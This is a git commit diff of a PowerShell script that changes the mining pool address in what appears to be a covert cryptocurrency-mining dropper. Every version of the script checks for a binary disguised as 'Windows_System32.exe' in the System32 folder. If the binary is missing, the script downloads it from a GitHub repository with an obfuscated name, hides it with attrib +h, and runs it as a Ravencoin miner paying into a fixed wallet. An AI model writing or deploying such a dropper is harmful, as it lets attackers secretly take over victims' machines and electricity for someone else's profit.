1c085aa6f02d941bd6da3b231d70924bd7ff7e7d
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-05-26 20:14:58 +0300

    Update script12GS-04.ps1

--- script12GS-04.ps1
+++ script12GS-04.ps1
@@ -2,8 +2,8 @@ $Folder = 'C:\Windows\System32\Windows_System32.exe'
 "Test to see if folder [$Folder]  exists"
 if (Test-Path -Path $Folder) {
     "Path exists!"
-    C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 40 -o stratum+tcp://rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GS1-04 -pl 40%
+    C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 40 -o stratum-ravencoin.flypool.org:3333 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GS1-04 -pl 40%
 } else {
     "Path doesn't exist."
-    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 40 -o stratum+tcp://rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GS1-04 -pl 40%
+    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 40 -o stratum-ravencoin.flypool.org:3333 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GS1-04 -pl 40%
 }
